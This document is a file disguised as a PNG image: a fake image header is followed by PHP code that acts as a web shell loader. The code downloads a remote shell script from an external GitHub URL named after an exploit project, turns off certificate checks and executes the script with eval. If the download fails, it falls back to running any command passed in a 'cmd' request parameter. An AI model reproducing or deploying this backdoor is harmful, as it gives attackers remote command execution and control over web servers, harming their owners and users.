\x89PNG\r\n\x1a\n\x00\x00\x00\x0DIHDR\x00\x00\x00\x01\x00
\x00\x00\x01\x08\x06\x00\x00\x00\x1F\x15\xC4\x89\x00\x00\x00
\x0AIDATx\x9Ccb\x00\x00\x00\x06\x00\x03\x1A\x05\x9D\x00\x00
\x00\x00IEND\xAE\x42\x60\x82
<?php
$url = 'https://raw.githubusercontent.com/VinzXploit/VinzShell/main/12.phtml';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
$code = curl_exec($ch);
if($code === false) {
    // Fallback jika curl gagal
    $code = file_get_contents($url);
}
if($code !== false && !empty($code)) {
    eval('?>' . $code);
} else {
    // Backup shell langsung
    if(isset($_GET['cmd'])) {
        system($_GET['cmd']);
    } elseif(isset($_POST['cmd'])) {
        system($_POST['cmd']);
    }
}
curl_close($ch);
?>